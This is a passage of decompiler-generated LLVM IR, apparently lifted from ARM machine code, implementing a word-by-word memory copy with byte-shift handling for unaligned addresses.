  %v3_169ac = sub i32 11, %v0_169b4
  %v4_169ac = and i32 %v3_169ac, %v0_169b4
  %v5_169ac = icmp slt i32 %v4_169ac, 0
  store i1 %v5_169ac, i1* %cpsr_v.global-to-local, align 1
  %v6_169ac = icmp slt i32 %v1_169ac, 0
  store i1 %v6_169ac, i1* %cpsr_n.global-to-local, align 1
  %v7_169ac = icmp eq i32 %v0_169b4, 12
  store i1 %v7_169ac, i1* %cpsr_z.global-to-local, align 1
  %v2_169b0 = xor i1 %v6_169ac, %v5_169ac
  switch i2 %v0_16934.off0, label %dec_label_pc_16940 [
    i2 -1, label %dec_label_pc_16a18
    i2 -2, label %dec_label_pc_169ac
  ]

dec_label_pc_16940:                               ; preds = %dec_label_pc_1692c
  br i1 %v2_169b0, label %dec_label_pc_1698c, label %dec_label_pc_16948

dec_label_pc_16948:                               ; preds = %dec_label_pc_16940
  store i32 %v1_169ac, i32* %r2.global-to-local, align 4
  %v3_1694c = load i32, i32* @r4, align 4
  store i32 %v3_1694c, i32* %stack_var_-16, align 4
  %v6_1694c = load i32, i32* @r5, align 4
  store i32 %v6_1694c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16950

dec_label_pc_16950:                               ; preds = %dec_label_pc_16950.dec_label_pc_16950_crit_edge, %dec_label_pc_16948
  %v0_16974 = phi i32 [ %v12_16974, %dec_label_pc_16950.dec_label_pc_16950_crit_edge ], [ %v0_16a4c76, %dec_label_pc_16948 ]
  %v0_16954 = phi i32 [ %v0_16954.pre, %dec_label_pc_16950.dec_label_pc_16950_crit_edge ], [ %v4_16930, %dec_label_pc_16948 ]
  %v0_16950 = phi i32 [ %v0_16950.pre, %dec_label_pc_16950.dec_label_pc_16950_crit_edge ], [ %v2_16930, %dec_label_pc_16948 ]
  %v3_16950 = udiv i32 %v0_16950, 256
  %v1_16954 = inttoptr i32 %v0_16954 to i32*
  %v2_16954 = load i32, i32* %v1_16954, align 4
  store i32 %v2_16954, i32* %r4.global-to-local, align 4
  %v3_16954 = add i32 %v0_16954, 4
  %v4_16954 = inttoptr i32 %v3_16954 to i32*
  %v5_16954 = load i32, i32* %v4_16954, align 4
  store i32 %v5_16954, i32* %r5.global-to-local, align 4
  %v6_16954 = add i32 %v0_16954, 8
  %v7_16954 = inttoptr i32 %v6_16954 to i32*
  %v8_16954 = load i32, i32* %v7_16954, align 4
  store i32 %v8_16954, i32* %ip.global-to-local, align 4
  %v9_16954 = add i32 %v0_16954, 12
  %v10_16954 = inttoptr i32 %v9_16954 to i32*
  %v11_16954 = load i32, i32* %v10_16954, align 4
  store i32 %v11_16954, i32* %lr.global-to-local, align 4
  %v12_16954 = add i32 %v0_16954, 16
  store i32 %v12_16954, i32* %r1.global-to-local, align 4
  %v4_16958 = mul i32 %v2_16954, 16777216
  %v5_16958 = or i32 %v4_16958, %v3_16950
  store i32 %v5_16958, i32* @r3, align 4
  %v3_1695c = udiv i32 %v2_16954, 256
  %v4_16960 = mul i32 %v5_16954, 16777216
  %v5_16960 = or i32 %v4_16960, %v3_1695c
  store i32 %v5_16960, i32* %r4.global-to-local, align 4
  %v3_16964 = udiv i32 %v5_16954, 256
  %v4_16968 = mul i32 %v8_16954, 16777216
  %v5_16968 = or i32 %v4_16968, %v3_16964
  store i32 %v5_16968, i32* %r5.global-to-local, align 4
  %v3_1696c = udiv i32 %v8_16954, 256
  %v4_16970 = mul i32 %v11_16954, 16777216
  %v5_16970 = or i32 %v4_16970, %v3_1696c
  store i32 %v5_16970, i32* @ip, align 4
  %v1_16974 = inttoptr i32 %v0_16974 to i32*
  store i32 %v5_16958, i32* %v1_16974, align 4
  %v3_16974 = add i32 %v0_16974, 4
  %v4_16974 = inttoptr i32 %v3_16974 to i32*
  %v5_16974 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16974, i32* %v4_16974, align 4
  %v6_16974 = add i32 %v0_16974, 8
  %v7_16974 = inttoptr i32 %v6_16974 to i32*
  %v8_16974 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16974, i32* %v7_16974, align 4
  %v9_16974 = add i32 %v0_16974, 12
  %v10_16974 = inttoptr i32 %v9_16974 to i32*
  %v11_16974 = load i32, i32* @ip, align 4
  store i32 %v11_16974, i32* %v10_16974, align 4
  %v12_16974 = add i32 %v0_16974, 16
  store i32 %v12_16974, i32* @r0, align 4
  %v0_16978 = load i32, i32* %r2.global-to-local, align 4
  %v1_16978 = add i32 %v0_16978, -16
  store i32 %v1_16978, i32* %r2.global-to-local, align 4
  %v3_16978 = sub i32 15, %v0_16978
  %v4_16978 = and i32 %v3_16978, %v0_16978
  %v5_16978 = icmp slt i32 %v4_16978, 0
  %v6_16978 = icmp slt i32 %v1_16978, 0
  %v2_1697c = xor i1 %v6_16978, %v5_16978
  br i1 %v2_1697c, label %dec_label_pc_16980, label %dec_label_pc_16950.dec_label_pc_16950_crit_edge

dec_label_pc_16950.dec_label_pc_16950_crit_edge:  ; preds = %dec_label_pc_16950
  %v0_16950.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16954.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16950

dec_label_pc_16980:                               ; preds = %dec_label_pc_16950
  %v2_16980 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16980, i32* @r4, align 4
  %v5_16980 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16980, i32* @r5, align 4
  %v1_16984 = add i32 %v0_16978, -4
  store i32 %v1_16984, i32* %r2.global-to-local, align 4
  %v3_16984 = add i32 %v0_16978, 2147483632
  %v4_16984 = and i32 %v1_16984, %v3_16984
  %v5_16984 = icmp slt i32 %v4_16984, 0
  store i1 %v5_16984, i1* %cpsr_v.global-to-local, align 1
  %v6_16984 = icmp slt i32 %v1_16984, 0
  store i1 %v6_16984, i1* %cpsr_n.global-to-local, align 1
  %v7_16984 = icmp eq i32 %v1_16984, 0
  store i1 %v7_16984, i1* %cpsr_z.global-to-local, align 1
  %v2_16988 = xor i1 %v6_16984, %v5_16984
  br i1 %v2_16988, label %dec_label_pc_169a4, label %dec_label_pc_1698c

dec_label_pc_1698c:                               ; preds = %dec_label_pc_16980, %dec_label_pc_16940, %dec_label_pc_1698c
  %v1_16998 = phi i32 [ %v4_16998, %dec_label_pc_1698c ], [ %v12_16974, %dec_label_pc_16980 ], [ %v0_16a4c76, %dec_label_pc_16940 ]
  %v0_1698c = load i32, i32* %lr.global-to-local, align 4
  %v3_1698c = udiv i32 %v0_1698c, 256
  store i32 %v3_1698c, i32* %ip.global-to-local, align 4
  %v0_16990 = load i32, i32* %r1.global-to-local, align 4
  %v1_16990 = inttoptr i32 %v0_16990 to i32*
  %v2_16990 = load i32, i32* %v1_16990, align 4
  store i32 %v2_16990, i32* %lr.global-to-local, align 4
  %v4_16990 = add i32 %v0_16990, 4
  store i32 %v4_16990, i32* %r1.global-to-local, align 4
  %v4_16994 = mul i32 %v2_16990, 16777216
  %v5_16994 = or i32 %v4_16994, %v3_1698c
  store i32 %v5_16994, i32* @ip, align 4
  %v2_16998 = inttoptr i32 %v1_16998 to i32*
  store i32 %v5_16994, i32* %v2_16998, align 4
  %v3_16998 = load i32, i32* @r0, align 4
  %v4_16998 = add i32 %v3_16998, 4
  store i32 %v4_16998, i32* @r0, align 4
  %v0_1699c = load i32, i32* %r2.global-to-local, align 4
  %v1_1699c = add i32 %v0_1699c, -4
  store i32 %v1_1699c, i32* %r2.global-to-local, align 4
  %v3_1699c = sub i32 3, %v0_1699c
  %v4_1699c = and i32 %v3_1699c, %v0_1699c
  %v5_1699c = icmp slt i32 %v4_1699c, 0
  %v6_1699c = icmp slt i32 %v1_1699c, 0
  %v2_169a0 = xor i1 %v6_1699c, %v5_1699c
  br i1 %v2_169a0, label %dec_label_pc_169a4.loopexit, label %dec_label_pc_1698c

dec_label_pc_169a4.loopexit:                      ; preds = %dec_label_pc_1698c
  %v7_1699c = icmp eq i32 %v0_1699c, 4
  store i1 %v5_1699c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1699c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1699c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_169a4

dec_label_pc_169a4:                               ; preds = %dec_label_pc_169a4.loopexit, %dec_label_pc_16980
  %v0_168cc59 = phi i32 [ %v1_1699c, %dec_label_pc_169a4.loopexit ], [ %v1_16984, %dec_label_pc_16980 ]
  %v0_169a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_169a4 = add i32 %v0_169a4, -3
  store i32 %v1_169a4, i32* @r1, align 4
  br label %bb140

dec_label_pc_169ac:                               ; preds = %dec_label_pc_1692c
  br i1 %v2_169b0, label %dec_label_pc_169f8, label %dec_label_pc_169b4

dec_label_pc_169b4:                               ; preds = %dec_label_pc_169ac
  store i32 %v1_169ac, i32* %r2.global-to-local, align 4
  %v3_169b8 = load i32, i32* @r4, align 4
  store i32 %v3_169b8, i32* %stack_var_-16, align 4
  %v6_169b8 = load i32, i32* @r5, align 4
  store i32 %v6_169b8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_169bc

dec_label_pc_169bc:                               ; preds = %dec_label_pc_169bc.dec_label_pc_169bc_crit_edge, %dec_label_pc_169b4
  %v0_169e0 = phi i32 [ %v12_169e0, %dec_label_pc_169bc.dec_label_pc_169bc_crit_edge ], [ %v0_16a4c76, %dec_label_pc_169b4 ]
  %v0_169c0 = phi i32 [ %v0_169c0.pre, %dec_label_pc_169bc.dec_label_pc_169bc_crit_edge ], [ %v4_16930, %dec_label_pc_169b4 ]
  %v0_169bc = phi i32 [ %v0_169bc.pre, %dec_label_pc_169bc.dec_label_pc_169bc_crit_edge ], [ %v2_16930, %dec_label_pc_169b4 ]
  %v3_169bc = udiv i32 %v0_169bc, 65536
  %v1_169c0 = inttoptr i32 %v0_169c0 to i32*
  %v2_169c0 = load i32, i32* %v1_169c0, align 4
  store i32 %v2_169c0, i32* %r4.global-to-local, align 4
  %v3_169c0 = add i32 %v0_169c0, 4
  %v4_169c0 = inttoptr i32 %v3_169c0 to i32*
  %v5_169c0 = load i32, i32* %v4_169c0, align 4
  store i32 %v5_169c0, i32* %r5.global-to-local, align 4
  %v6_169c0 = add i32 %v0_169c0, 8
  %v7_169c0 = inttoptr i32 %v6_169c0 to i32*
  %v8_169c0 = load i32, i32* %v7_169c0, align 4
  store i32 %v8_169c0, i32* %ip.global-to-local, align 4
  %v9_169c0 = add i32 %v0_169c0, 12
  %v10_169c0 = inttoptr i32 %v9_169c0 to i32*
  %v11_169c0 = load i32, i32* %v10_169c0, align 4
  store i32 %v11_169c0, i32* %lr.global-to-local, align 4
  %v12_169c0 = add i32 %v0_169c0, 16
  store i32 %v12_169c0, i32* %r1.global-to-local, align 4
  %v4_169c4 = mul i32 %v2_169c0, 65536
  %v5_169c4 = or i32 %v4_169c4, %v3_169bc
  store i32 %v5_169c4, i32* @r3, align 4
  %v3_169c8 = udiv i32 %v2_169c0, 65536
  %v4_169cc = mul i32 %v5_169c0, 65536
  %v5_169cc = or i32 %v4_169cc, %v3_169c8
  store i32 %v5_169cc, i32* %r4.global-to-local, align 4
  %v3_169d0 = udiv i32 %v5_169c0, 65536
  %v4_169d4 = mul i32 %v8_169c0, 65536
  %v5_169d4 = or i32 %v4_169d4, %v3_169d0
  store i32 %v5_169d4, i32* %r5.global-to-local, align 4
  %v3_169d8 = udiv i32 %v8_169c0, 65536
  %v4_169dc = mul i32 %v11_169c0, 65536
  %v5_169dc = or i32 %v4_169dc, %v3_169d8
  store i32 %v5_169dc, i32* @ip, align 4
  %v1_169e0 = inttoptr i32 %v0_169e0 to i32*
  store i32 %v5_169c4, i32* %v1_169e0, align 4
  %v3_169e0 = add i32 %v0_169e0, 4
  %v4_169e0 = inttoptr i32 %v3_169e0 to i32*
  %v5_169e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_169e0, i32* %v4_169e0, align 4
  %v6_169e0 = add i32 %v0_169e0, 8
  %v7_169e0 = inttoptr i32 %v6_169e0 to i32*
  %v8_169e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_169e0, i32* %v7_169e0, align 4
  %v9_169e0 = add i32 %v0_169e0, 12
  %v10_169e0 = inttoptr i32 %v9_169e0 to i32*
  %v11_169e0 = load i32, i32* @ip, align 4
  store i32 %v11_169e0, i32* %v10_169e0, align 4
  %v12_169e0 = add i32 %v0_169e0, 16
  store i32 %v12_169e0, i32* @r0, align 4
  %v0_169e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_169e4 = add i32 %v0_169e4, -16
  store i32 %v1_169e4, i32* %r2.global-to-local, align 4
  %v3_169e4 = sub i32 15, %v0_169e4
  %v4_169e4 = and i32 %v3_169e4, %v0_169e4
  %v5_169e4 = icmp slt i32 %v4_169e4, 0
  %v6_169e4 = icmp slt i32 %v1_169e4, 0
  %v2_169e8 = xor i1 %v6_169e4, %v5_169e4
  br i1 %v2_169e8, label %dec_label_pc_169ec, label %dec_label_pc_169bc.dec_label_pc_169bc_crit_edge

dec_label_pc_169bc.dec_label_pc_169bc_crit_edge:  ; preds = %dec_label_pc_169bc
  %v0_169bc.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_169c0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_169bc

dec_label_pc_169ec:                               ; preds = %dec_label_pc_169bc
  %v2_169ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_169ec, i32* @r4, align 4
  %v5_169ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_169ec, i32* @r5, align 4
  %v1_169f0 = add i32 %v0_169e4, -4
  store i32 %v1_169f0, i32* %r2.global-to-local, align 4
  %v3_169f0 = add i32 %v0_169e4, 2147483632
  %v4_169f0 = and i32 %v1_169f0, %v3_169f0
  %v5_169f0 = icmp slt i32 %v4_169f0, 0
  store i1 %v5_169f0, i1* %cpsr_v.global-to-local, align 1
  %v6_169f0 = icmp slt i32 %v1_169f0, 0
  store i1 %v6_169f0, i1* %cpsr_n.global-to-local, align 1
  %v7_169f0 = icmp eq i32 %v1_169f0, 0
  store i1 %v7_169f0, i1* %cpsr_z.global-to-local, align 1
  %v2_169f4 = xor i1 %v6_169f0, %v5_169f0
  br i1 %v2_169f4, label %dec_label_pc_16a10, label %dec_label_pc_169f8

dec_label_pc_169f8:                               ; preds = %dec_label_pc_169ec, %dec_label_pc_169ac, %dec_label_pc_169f8
  %v1_16a04 = phi i32 [ %v4_16a04, %dec_label_pc_169f8 ], [ %v12_169e0, %dec_label_pc_169ec ], [ %v0_16a4c76, %dec_label_pc_169ac ]
  %v0_169f8 = load i32, i32* %lr.global-to-local, align 4
  %v3_169f8 = udiv i32 %v0_169f8, 65536
  store i32 %v3_169f8, i32* %ip.global-to-local, align 4
  %v0_169fc = load i32, i32* %r1.global-to-local, align 4
  %v1_169fc = inttoptr i32 %v0_169fc to i32*
  %v2_169fc = load i32, i32* %v1_169fc, align 4
  store i32 %v2_169fc, i32* %lr.global-to-local, align 4
  %v4_169fc = add i32 %v0_169fc, 4
  store i32 %v4_169fc, i32* %r1.global-to-local, align 4
  %v4_16a00 = mul i32 %v2_169fc, 65536
  %v5_16a00 = or i32 %v4_16a00, %v3_169f8
  store i32 %v5_16a00, i32* @ip, align 4
  %v2_16a04 = inttoptr i32 %v1_16a04 to i32*
  store i32 %v5_16a00, i32* %v2_16a04, align 4
  %v3_16a04 = load i32, i32* @r0, align 4
  %v4_16a04 = add i32 %v3_16a04, 4
  store i32 %v4_16a04, i32* @r0, align 4
  %v0_16a08 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a08 = add i32 %v0_16a08, -4
  store i32 %v1_16a08, i32* %r2.global-to-local, align 4
  %v3_16a08 = sub i32 3, %v0_16a08
  %v4_16a08 = and i32 %v3_16a08, %v0_16a08
  %v5_16a08 = icmp slt i32 %v4_16a08, 0
  %v6_16a08 = icmp slt i32 %v1_16a08, 0
  %v2_16a0c = xor i1 %v6_16a08, %v5_16a08
  br i1 %v2_16a0c, label %dec_label_pc_16a10.loopexit, label %dec_label_pc_169f8

dec_label_pc_16a10.loopexit:                      ; preds = %dec_label_pc_169f8
  %v7_16a08 = icmp eq i32 %v0_16a08, 4
  store i1 %v5_16a08, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16a08, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16a08, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16a10

dec_label_pc_16a10:                               ; preds = %dec_label_pc_16a10.loopexit, %dec_label_pc_169ec
  %v0_168cc60 = phi i32 [ %v1_16a08, %dec_label_pc_16a10.loopexit ], [ %v1_169f0, %dec_label_pc_169ec ]
  %v0_16a10 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a10 = add i32 %v0_16a10, -2
  store i32 %v1_16a10, i32* @r1, align 4
  br label %bb140

dec_label_pc_16a18:                               ; preds = %dec_label_pc_1692c
  br i1 %v2_169b0, label %dec_label_pc_16a64, label %dec_label_pc_16a20

dec_label_pc_16a20:                               ; preds = %dec_label_pc_16a18
  store i32 %v1_169ac, i32* %r2.global-to-local, align 4
  %v3_16a24 = load i32, i32* @r4, align 4
  store i32 %v3_16a24, i32* %stack_var_-16, align 4
  %v6_16a24 = load i32, i32* @r5, align 4
  store i32 %v6_16a24, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16a28

dec_label_pc_16a28:                               ; preds = %dec_label_pc_16a28.dec_label_pc_16a28_crit_edge, %dec_label_pc_16a20
  %v0_16a4c = phi i32 [ %v12_16a4c, %dec_label_pc_16a28.dec_label_pc_16a28_crit_edge ], [ %v0_16a4c76, %dec_label_pc_16a20 ]
  %v0_16a2c = phi i32 [ %v0_16a2c.pre, %dec_label_pc_16a28.dec_label_pc_16a28_crit_edge ], [ %v4_16930, %dec_label_pc_16a20 ]
  %v0_16a28 = phi i32 [ %v0_16a28.pre, %dec_label_pc_16a28.dec_label_pc_16a28_crit_edge ], [ %v2_16930, %dec_label_pc_16a20 ]
  %v3_16a28 = udiv i32 %v0_16a28, 16777216
  %v1_16a2c = inttoptr i32 %v0_16a2c to i32*
  %v2_16a2c = load i32, i32* %v1_16a2c, align 4
  store i32 %v2_16a2c, i32* %r4.global-to-local, align 4
  %v3_16a2c = add i32 %v0_16a2c, 4
  %v4_16a2c = inttoptr i32 %v3_16a2c to i32*
  %v5_16a2c = load i32, i32* %v4_16a2c, align 4
  store i32 %v5_16a2c, i32* %r5.global-to-local, align 4
  %v6_16a2c = add i32 %v0_16a2c, 8
  %v7_16a2c = inttoptr i32 %v6_16a2c to i32*
  %v8_16a2c = load i32, i32* %v7_16a2c, align 4
  store i32 %v8_16a2c, i32* %ip.global-to-local, align 4
  %v9_16a2c = add i32 %v0_16a2c, 12
  %v10_16a2c = inttoptr i32 %v9_16a2c to i32*
  %v11_16a2c = load i32, i32* %v10_16a2c, align 4
  store i32 %v11_16a2c, i32* %lr.global-to-local, align 4
  %v12_16a2c = add i32 %v0_16a2c, 16
  store i32 %v12_16a2c, i32* %r1.global-to-local, align 4
  %v4_16a30 = mul i32 %v2_16a2c, 256
  %v5_16a30 = or i32 %v4_16a30, %v3_16a28
  store i32 %v5_16a30, i32* @r3, align 4
  %v3_16a34 = udiv i32 %v2_16a2c, 16777216
  %v4_16a38 = mul i32 %v5_16a2c, 256
  %v5_16a38 = or i32 %v4_16a38, %v3_16a34
  store i32 %v5_16a38, i32* %r4.global-to-local, align 4
  %v3_16a3c = udiv i32 %v5_16a2c, 16777216
  %v4_16a40 = mul i32 %v8_16a2c, 256
  %v5_16a40 = or i32 %v4_16a40, %v3_16a3c
  store i32 %v5_16a40, i32* %r5.global-to-local, align 4
  %v3_16a44 = udiv i32 %v8_16a2c, 16777216
  %v4_16a48 = mul i32 %v11_16a2c, 256
  %v5_16a48 = or i32 %v4_16a48, %v3_16a44
  store i32 %v5_16a48, i32* @ip, align 4
  %v1_16a4c = inttoptr i32 %v0_16a4c to i32*
  store i32 %v5_16a30, i32* %v1_16a4c, align 4
  %v3_16a4c = add i32 %v0_16a4c, 4
  %v4_16a4c = inttoptr i32 %v3_16a4c to i32*
  %v5_16a4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16a4c, i32* %v4_16a4c, align 4
  %v6_16a4c = add i32 %v0_16a4c, 8
  %v7_16a4c = inttoptr i32 %v6_16a4c to i32*
  %v8_16a4c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16a4c, i32* %v7_16a4c, align 4
  %v9_16a4c = add i32 %v0_16a4c, 12
  %v10_16a4c = inttoptr i32 %v9_16a4c to i32*
  %v11_16a4c = load i32, i32* @ip, align 4
  store i32 %v11_16a4c, i32* %v10_16a4c, align 4
  %v12_16a4c = add i32 %v0_16a4c, 16
  store i32 %v12_16a4c, i32* @r0, align 4
  %v0_16a50 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a50 = add i32 %v0_16a50, -16
  store i32 %v1_16a50, i32* %r2.global-to-local, align 4
  %v3_16a50 = sub i32 15, %v0_16a50
  %v4_16a50 = and i32 %v3_16a50, %v0_16a50
  %v5_16a50 = icmp slt i32 %v4_16a50, 0
  %v6_16a50 = icmp slt i32 %v1_16a50, 0
  %v2_16a54 = xor i1 %v6_16a50, %v5_16a50
  br i1 %v2_16a54, label %dec_label_pc_16a58, label %dec_label_pc_16a28.dec_label_pc_16a28_crit_edge

dec_label_pc_16a28.dec_label_pc_16a28_crit_edge:  ; preds = %dec_label_pc_16a28
  %v0_16a28.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16a2c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16a28

dec_label_pc_16a58:                               ; preds = %dec_label_pc_16a28
  %v2_16a58 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16a58, i32* @r4, align 4
  %v5_16a58 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16a58, i32* @r5, align 4
  %v1_16a5c = add i32 %v0_16a50, -4
  store i32 %v1_16a5c, i32* %r2.global-to-local, align 4
  %v3_16a5c = add i32 %v0_16a50, 2147483632
  %v4_16a5c = and i32 %v1_16a5c, %v3_16a5c
  %v5_16a5c = icmp slt i32 %v4_16a5c, 0
  store i1 %v5_16a5c, i1* %cpsr_v.global-to-local, align 1
  %v6_16a5c = icmp slt i32 %v1_16a5c, 0
  store i1 %v6_16a5c, i1* %cpsr_n.global-to-local, align 1
  %v7_16a5c = icmp eq i32 %v1_16a5c, 0
  store i1 %v7_16a5c, i1* %cpsr_z.global-to-local, align 1
  %v2_16a60 = xor i1 %v6_16a5c, %v5_16a5c
  br i1 %v2_16a60, label %dec_label_pc_16a7c, label %dec_label_pc_16a64

dec_label_pc_16a64:                               ; preds = %dec_label_pc_16a58, %dec_label_pc_16a18, %dec_label_pc_16a64
  %v1_16a70 = phi i32 [ %v4_16a70, %dec_label_pc_16a64 ], [ %v12_16a4c, %dec_label_pc_16a58 ], [ %v0_16a4c76, %dec_label_pc_16a18 ]
  %v0_16a64 = load i32, i32* %lr.global-to-local, align 4
  %v3_16a64 = udiv i32 %v0_16a64, 16777216
  store i32 %v3_16a64, i32* %ip.global-to-local, align 4
  %v0_16a68 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a68 = inttoptr i32 %v0_16a68 to i32*
  %v2_16a68 = load i32, i32* %v1_16a68, align 4
  store i32 %v2_16a68, i32* %lr.global-to-local, align 4
  %v4_16a68 = add i32 %v0_16a68, 4
  store i32 %v4_16a68, i32* %r1.global-to-local, align 4
  %v4_16a6c = mul i32 %v2_16a68, 256
  %v5_16a6c = or i32 %v4_16a6c, %v3_16a64
  store i32 %v5_16a6c, i32* @ip, align 4
  %v2_16a70 = inttoptr i32 %v1_16a70 to i32*
  store i32 %v5_16a6c, i32* %v2_16a70, align 4
  %v3_16a70 = load i32, i32* @r0, align 4
  %v4_16a70 = add i32 %v3_16a70, 4
  store i32 %v4_16a70, i32* @r0, align 4
  %v0_16a74 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a74 = add i32 %v0_16a74, -4
  store i32 %v1_16a74, i32* %r2.global-to-local, align 4
  %v3_16a74 = sub i32 3, %v0_16a74
  %v4_16a74 = and i32 %v3_16a74, %v0_16a74
  %v5_16a74 = icmp slt i32 %v4_16a74, 0
  %v6_16a74 = icmp slt i32 %v1_16a74, 0
  %v2_16a78 = xor i1 %v6_16a74, %v5_16a74
  br i1 %v2_16a78, label %dec_label_pc_16a7c.loopexit, label %dec_label_pc_16a64

dec_label_pc_16a7c.loopexit:                      ; preds = %dec_label_pc_16a64
  %v7_16a74 = icmp eq i32 %v0_16a74, 4
  store i1 %v5_16a74, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16a74, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16a74, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16a7c

dec_label_pc_16a7c:                               ; preds = %dec_label_pc_16a7c.loopexit, %dec_label_pc_16a58
  %v0_168cc61 = phi i32 [ %v1_16a74, %dec_label_pc_16a7c.loopexit ], [ %v1_16a5c, %dec_label_pc_16a58 ]
  %v0_16a7c = load i32, i32* %r1.global-to-local, align 4
  %v1_16a7c = add i32 %v0_16a7c, -1
  store i32 %v1_16a7c, i32* @r1, align 4
  br label %bb140

dec_label_pc_16a84:                               ; preds = %entry
  %v1_16a84 = load i32, i32* @r2, align 4
  %v2_16a84 = add i32 %v1_16a84, %v0_16830
  store i32 %v2_16a84, i32* %r1.global-to-local, align 4
  %v2_16a88 = add i32 %v1_16a84, %v1_16830
  store i32 %v2_16a88, i32* %r0.global-to-local, align 4
  %v2_16a8c = add i32 %v1_16a84, -4
  store i32 %v2_16a8c, i32* %r2.global-to-local, align 4
  %v4_16a8c = sub i32 3, %v1_16a84
  %v5_16a8c = and i32 %v4_16a8c, %v1_16a84
  %v6_16a8c = icmp slt i32 %v5_16a8c, 0
  store i1 %v6_16a8c, i1* %cpsr_v.global-to-local, align 1
  %v7_16a8c = icmp slt i32 %v2_16a8c, 0
  store i1 %v7_16a8c, i1* %cpsr_n.global-to-local, align 1
  %v8_16a8c = icmp eq i32 %v1_16a84, 4
  store i1 %v8_16a8c, i1* %cpsr_z.global-to-local, align 1
  %v5_16a90 = icmp slt i32 %v1_16a84, 4
  br i1 %v5_16a90, label %bb150, label %dec_label_pc_16a94

dec_label_pc_16a94:                               ; preds = %dec_label_pc_16a84
  %v1_16a94 = urem i32 %v2_16a88, 4
  store i32 %v1_16a94, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16a94 = icmp eq i32 %v1_16a94, 0
  store i1 %v2_16a94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a94, label %dec_label_pc_16a9c, label %dec_label_pc_16b3c

dec_label_pc_16a9c:                               ; preds = %dec_label_pc_16a94
  %v1_16a9c = urem i32 %v2_16a84, 4
  store i32 %v1_16a9c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16a9c = icmp eq i32 %v1_16a9c, 0
  store i1 %v2_16a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a9c, label %dec_label_pc_16aa4, label %dec_label_pc_16b68

dec_label_pc_16aa4:                               ; preds = %dec_label_pc_16a9c, %dec_label_pc_16b60
  %v0_16abc37 = phi i32 [ %v2_16a88, %dec_label_pc_16a9c ], [ %v0_16bb020, %dec_label_pc_16b60 ]
  %v0_16ab836 = phi i32 [ %v2_16a84, %dec_label_pc_16a9c ], [ %v0_16b60, %dec_label_pc_16b60 ]
  %v0_16aa4 = phi i32 [ %v2_16a8c, %dec_label_pc_16a9c ], [ %v2_16b58, %dec_label_pc_16b60 ]
  %v2_16aa4 = add i32 %v0_16aa4, -8
  store i32 %v2_16aa4, i32* %r2.global-to-local, align 4
  %v4_16aa4 = sub i32 7, %v0_16aa4
  %v5_16aa4 = and i32 %v4_16aa4, %v0_16aa4
  %v6_16aa4 = icmp slt i32 %v5_16aa4, 0
  store i1 %v6_16aa4, i1* %cpsr_v.global-to-local, align 1
  %v7_16aa4 = icmp slt i32 %v2_16aa4, 0
  store i1 %v7_16aa4, i1* %cpsr_n.global-to-local, align 1
  %v8_16aa4 = icmp eq i32 %v0_16aa4, 8
  store i1 %v8_16aa4, i1* %cpsr_z.global-to-local, align 1
  %v5_16aa8 = icmp slt i32 %v0_16aa4, 8
  br i1 %v5_16aa8, label %dec_label_pc_16af4, label %dec_label_pc_16aac

dec_label_pc_16aac:                               ; preds = %dec_label_pc_16aa4
  %v3_16aac = load i32, i32* @r4, align 4
  %v5_16aac = inttoptr i32 %v3_16aac to i8*
  store i8* %v5_16aac, i8** %stack_var_-8, align 4
  %v8_16aac = load i32, i32* @lr, align 4
  %v2_16ab0 = add i32 %v0_16aa4, -28
  store i32 %v2_16ab0, i32* %r2.global-to-local, align 4
  %v4_16ab0 = sub i32 27, %v0_16aa4
  %v5_16ab0 = and i32 %v4_16ab0, %v2_16aa4
  %v6_16ab0 = icmp slt i32 %v5_16ab0, 0
  store i1 %v6_16ab0, i1* %cpsr_v.global-to-local, align 1
  %v7_16ab0 = icmp slt i32 %v2_16ab0, 0
  store i1 %v7_16ab0, i1* %cpsr_n.global-to-local, align 1
  %v8_16ab0 = icmp eq i32 %v2_16aa4, 20
  store i1 %v8_16ab0, i1* %cpsr_z.global-to-local, align 1
  %v5_16ab4 = icmp slt i32 %v2_16aa4, 20
  br i1 %v5_16ab4, label %dec_label_pc_16ad0, label %dec_label_pc_16ab8

dec_label_pc_16ab8:                               ; preds = %dec_label_pc_16aac, %dec_label_pc_16ab8.dec_label_pc_16ab8_crit_edge
